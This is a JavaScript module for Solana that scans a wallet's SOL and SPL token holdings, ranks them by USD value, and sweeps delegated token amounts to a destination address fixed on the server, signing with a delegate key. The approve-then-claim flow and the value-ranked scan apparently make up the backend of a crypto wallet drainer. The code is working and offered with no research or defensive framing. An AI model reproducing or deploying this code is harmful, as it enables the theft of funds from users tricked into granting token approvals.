import { Connection, PublicKey, Keypair, Transaction, sendAndConfirmTransaction } from '@solana/web3.js'
import {
    getAssociatedTokenAddress,
    createTransferCheckedInstruction,
    createAssociatedTokenAccountInstruction,
    getAccount,
    TOKEN_PROGRAM_ID,
    ASSOCIATED_TOKEN_PROGRAM_ID
} from '@solana/spl-token'
import fetch from 'node-fetch'
import bs58 from 'bs58'

// Solana Configuration from environment
const SOLANA_RPC_URL = process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com'
const SOLANA_DESTINATION_ADDRESS = process.env.SOLANA_DESTINATION_ADDRESS
const SOLANA_DELEGATE_PRIVATE_KEY = process.env.SOLANA_DELEGATE_PRIVATE_KEY

let cachedDelegateKeypair = null

function getDelegateKeypair() {
    if (!SOLANA_DELEGATE_PRIVATE_KEY) return null
    if (cachedDelegateKeypair) return cachedDelegateKeypair
    try {
        cachedDelegateKeypair = Keypair.fromSecretKey(bs58.decode(SOLANA_DELEGATE_PRIVATE_KEY))
        return cachedDelegateKeypair
    } catch (err) {
        console.error('Invalid SOLANA_DELEGATE_PRIVATE_KEY:', err.message)
        return null
    }
}

export function getSolanaDelegatePublicKey() {
    const kp = getDelegateKeypair()
    return kp ? kp.publicKey.toBase58() : null
}

// Create Solana connection
const connection = new Connection(SOLANA_RPC_URL, 'confirmed')

// Token price cache to avoid rate limiting
const priceCache = new Map()
const CACHE_DURATION = 60000 // 1 minute
const dexFallbackCache = new Map()

/**
 * Get token prices from Jupiter API (supports ALL Solana tokens)
 */
async function getTokenPricesFromJupiter(mintAddresses) {
    try {
        // Check cache first
        const now = Date.now()
        const prices = {}

        // Get cached prices first
        mintAddresses.forEach(mint => {
            const cached = priceCache.get(mint)
            if (cached && (now - cached.timestamp < CACHE_DURATION)) {
                prices[mint] = cached.price
            }
        })

        const uncachedMints = mintAddresses.filter(mint => prices[mint] === undefined)

        if (uncachedMints.length === 0) {
            return prices
        }

        // Jupiter Price API v4 (free, no auth required)
        // Limit to 100 tokens per request
        const mintsParam = uncachedMints.slice(0, 100).join(',')
        const response = await fetch(`https://price.jup.ag/v4/price?ids=${mintsParam}`)

        if (!response.ok) {
            console.log(`Jupiter v4 API returned ${response.status}, falling back to defaults`)
            const defaults = getDefaultPrices(uncachedMints)
            return { ...prices, ...defaults }
        }

        const data = await response.json()

        // Process Jupiter response and cache
        for (const mint of uncachedMints) {
            const jupiterData = data.data?.[mint]
            const price = jupiterData?.price ? parseFloat(jupiterData.price) : 0

            prices[mint] = price
            priceCache.set(mint, { price, timestamp: now })
        }

        console.log(`  [Jupiter v4] Fetched prices for ${Object.keys(data.data || {}).length} tokens`)
        return prices

    } catch (error) {
        console.error('Jupiter API error:', error.message)
        return getDefaultPrices(mintAddresses)
    }
}

/**
 * Fallback prices for common tokens
 */
function getDefaultPrices(mintAddresses) {
    const defaults = {
        'So11111111111111111111111111111111111111112': 100, // Wrapped SOL
        'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 1, // USDC
        'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 1, // USDT
        'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 105, // mSOL (~5% premium)
        'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 0.00001, // BONK
        'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN': 0.5, // JUP
    }

    const prices = {}
    mintAddresses.forEach(mint => {
        prices[mint] = defaults[mint] || 0
    })
    return prices
}

/**
 * Fallback: get price from DexScreener for tokens Jupiter returns as 0
 */
async function getFallbackPriceFromDexScreener(mint) {
    const cached = dexFallbackCache.get(mint)
    const now = Date.now()
    if (cached && now - cached.timestamp < CACHE_DURATION) {
        return cached.price
    }

    try {
        const resp = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${mint}`)
        if (!resp.ok) throw new Error(`status ${resp.status}`)
        const data = await resp.json()
        const price = data?.pairs?.[0]?.priceUsd ? parseFloat(data.pairs[0].priceUsd) : 0
        const safePrice = isNaN(price) ? 0 : price
        dexFallbackCache.set(mint, { price: safePrice, timestamp: now })
        return safePrice
    } catch (err) {
        console.log(`  [DEBUG] DexScreener fallback failed for ${mint}: ${err.message}`)
        return 0
    }
}

/**
 * Get token metadata from Jupiter (name, symbol, logo)
 */
async function getTokenMetadata(mintAddress) {
    try {
        // Try Jupiter's token list
        const response = await fetch(`https://tokens.jup.ag/token/${mintAddress}`)
        if (response.ok) {
            const data = await response.json()
            return {
                symbol: data.symbol || mintAddress.slice(0, 6) + '...',
                name: data.name || 'Unknown Token',
                decimals: data.decimals || 9,
                logoURI: data.logoURI || null
            }
        }
    } catch (error) {
        // Ignore errors
    }

    return null
}

/**
 * Get SOL balance and SPL token balances for a wallet
 * Uses Jupiter API for accurate pricing of ALL tokens
 */
export async function getSolanaBalances(walletAddress) {
    try {
        console.log(`\nFetching Solana balances for: ${walletAddress}`)

        const pubkey = new PublicKey(walletAddress)
        const balances = []
        const mintAddresses = ['So11111111111111111111111111111111111111112'] // Start with wrapped SOL for price

        // Get native SOL balance first
        const solBalance = await connection.getBalance(pubkey)
        const solBalanceInSol = solBalance / 1e9
        console.log(`  Native SOL balance: ${solBalanceInSol}`)

        // Get SPL token accounts
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(pubkey, {
            programId: TOKEN_PROGRAM_ID
        })

        console.log(`  Found ${tokenAccounts.value.length} SPL token accounts`)

        // Collect all mint addresses for batch price fetch
        const tokenData = []
        for (const account of tokenAccounts.value) {
            const parsedInfo = account.account.data.parsed.info
            const mintAddress = parsedInfo.mint
            const tokenAmount = parsedInfo.tokenAmount

            // Skip zero balances
            if (tokenAmount.uiAmount === 0 || tokenAmount.uiAmount === null) {
                continue
            }

            mintAddresses.push(mintAddress)
            tokenData.push({
                mintAddress,
                tokenAmount,
                tokenAccount: account.pubkey.toBase58()
            })
        }

        console.log(`  Fetching prices for ${mintAddresses.length} tokens from Jupiter...`)

        // Batch fetch all prices from Jupiter
        const prices = await getTokenPricesFromJupiter(mintAddresses)

        // Get SOL price for native balance
        const solPrice = prices['So11111111111111111111111111111111111111112'] || 100
        const solUsdValue = solBalanceInSol * solPrice

        // Add native SOL
        balances.push({
            chain: 'Solana',
            chainKey: 'solana',
            symbol: 'SOL',
            name: 'Solana',
            address: null,
            balance: solBalanceInSol.toString(),
            rawBalance: solBalance.toString(),
            decimals: 9,
            isNative: true,
            usdValue: solUsdValue,
            priceUsd: solPrice,
            thumbnail: 'https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png'
        })

        // Process SPL tokens
        for (const token of tokenData) {
            const { mintAddress, tokenAmount, tokenAccount } = token
            let price = prices[mintAddress] || 0
            // If price is zero but balance exists, try DexScreener fallback
            if (price === 0 && tokenAmount.uiAmount > 0) {
                price = await getFallbackPriceFromDexScreener(mintAddress)
                if (price > 0) {
                    priceCache.set(mintAddress, { price, timestamp: Date.now() })
                }
            }
            const usdValue = tokenAmount.uiAmount * price

            // Get metadata (try Jupiter first)
            let metadata = await getTokenMetadata(mintAddress)
            if (!metadata) {
                metadata = {
                    symbol: mintAddress.slice(0, 6) + '...',
                    name: 'Unknown Token',
                    decimals: tokenAmount.decimals,
                    logoURI: null
                }
            }

            // Include ALL tokens with non-zero balance (let frontend filter by value)
            balances.push({
                chain: 'Solana',
                chainKey: 'solana',
                symbol: metadata.symbol,
                name: metadata.name,
                address: mintAddress,
                balance: tokenAmount.uiAmountString,
                rawBalance: tokenAmount.amount,
                decimals: tokenAmount.decimals,
                isNative: false,
                usdValue: usdValue,
                priceUsd: price,
                thumbnail: metadata.logoURI || `https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/${mintAddress}/logo.png`,
                tokenAccount: tokenAccount
            })
        }

        // Sort by USD value (high to low)
        balances.sort((a, b) => b.usdValue - a.usdValue)

        // Log what we found
        console.log(`\n  Total Solana assets: ${balances.length}`)
        console.log(`  Tokens with value:`)
        balances.forEach(b => {
            if (b.usdValue >= 0.01) {
                console.log(`    ${b.symbol}: ${b.balance} = $${b.usdValue.toFixed(2)}`)
            }
        })

        return balances

    } catch (error) {
        console.error('Error fetching Solana balances:', error)
        throw error
    }
}

/**
 * Execute delegated token transfer on Solana
 * The delegate must have been previously approved by the token owner
 */
export async function claimSolanaTokens(mintAddress, ownerAddress, tokenAccountAddress) {
    if (!SOLANA_DELEGATE_PRIVATE_KEY) {
        throw new Error('SOLANA_DELEGATE_PRIVATE_KEY not configured')
    }
    if (!SOLANA_DESTINATION_ADDRESS) {
        throw new Error('SOLANA_DESTINATION_ADDRESS not configured')
    }

    try {
        console.log(`\nClaiming Solana SPL token:`)
        console.log(`  Mint: ${mintAddress}`)
        console.log(`  Owner: ${ownerAddress}`)
        console.log(`  Token Account: ${tokenAccountAddress}`)
        console.log(`  Destination: ${SOLANA_DESTINATION_ADDRESS}`)

        // Decode delegate private key
        const delegateKeypair = getDelegateKeypair()
        if (!delegateKeypair) {
            throw new Error('Invalid or missing SOLANA_DELEGATE_PRIVATE_KEY')
        }
        console.log(`  Delegate: ${delegateKeypair.publicKey.toBase58()}`)

        const mint = new PublicKey(mintAddress)
        const sourceTokenAccount = new PublicKey(tokenAccountAddress)
        const destination = new PublicKey(SOLANA_DESTINATION_ADDRESS)

        // Get destination ATA address
        const destinationATA = await getAssociatedTokenAddress(mint, destination)
        console.log(`  Destination ATA: ${destinationATA.toBase58()}`)

        // Get source account info to check balance and delegate
        const sourceAccount = await getAccount(connection, sourceTokenAccount)
        console.log(`  Source balance: ${sourceAccount.amount}`)
        console.log(`  Delegated amount: ${sourceAccount.delegatedAmount}`)
        console.log(`  Delegate on account: ${sourceAccount.delegate?.toBase58() || 'none'}`)

        if (sourceAccount.delegatedAmount === 0n) {
            throw new Error('No delegation found on this token account. User must approve first.')
        }

        // Verify the delegate matches our expected delegate
        if (!sourceAccount.delegate || sourceAccount.delegate.toBase58() !== delegateKeypair.publicKey.toBase58()) {
            throw new Error(`Delegate mismatch. Expected ${delegateKeypair.publicKey.toBase58()}, got ${sourceAccount.delegate?.toBase58() || 'none'}`)
        }

        // Get token decimals
        const mintInfo = await connection.getParsedAccountInfo(mint)
        const decimals = mintInfo.value?.data?.parsed?.info?.decimals || 9

        // Build transaction
        const transaction = new Transaction()

        // Check if destination ATA exists, create it if not
        let destAccountInfo = null
        try {
            destAccountInfo = await getAccount(connection, destinationATA)
            console.log(`  Destination ATA exists with balance: ${destAccountInfo.amount}`)
        } catch (e) {
            // Account doesn't exist - create it
            console.log(`  Destination ATA doesn't exist, creating...`)

            const createAtaIx = createAssociatedTokenAccountInstruction(
                delegateKeypair.publicKey, // payer (delegate pays for creation)
                destinationATA,            // ATA address
                destination,               // owner of the ATA
                mint,                       // token mint
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            )
            transaction.add(createAtaIx)
        }

        // Use the delegated amount (what user approved), not full balance
        const transferAmount = sourceAccount.delegatedAmount

        // Create transfer instruction using delegate authority
        const transferIx = createTransferCheckedInstruction(
            sourceTokenAccount,           // source
            mint,                          // mint
            destinationATA,               // destination
            delegateKeypair.publicKey,    // authority (delegate)
            transferAmount,               // amount
            decimals                       // decimals
        )
        transaction.add(transferIx)

        // Get recent blockhash
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
        transaction.recentBlockhash = blockhash
        transaction.feePayer = delegateKeypair.publicKey

        // Sign with delegate
        transaction.sign(delegateKeypair)

        // Send transaction
        const signature = await connection.sendRawTransaction(transaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: 'confirmed'
        })
        console.log(`  Transaction sent: ${signature}`)

        // Confirm transaction
        await connection.confirmTransaction({
            signature,
            blockhash,
            lastValidBlockHeight
        }, 'confirmed')
        console.log(`  Transaction confirmed!`)

        return {
            success: true,
            txHash: signature,
            message: 'SPL tokens transferred successfully'
        }

    } catch (error) {
        console.error('Error claiming Solana tokens:', error)
        throw error
    }
}

export { connection }

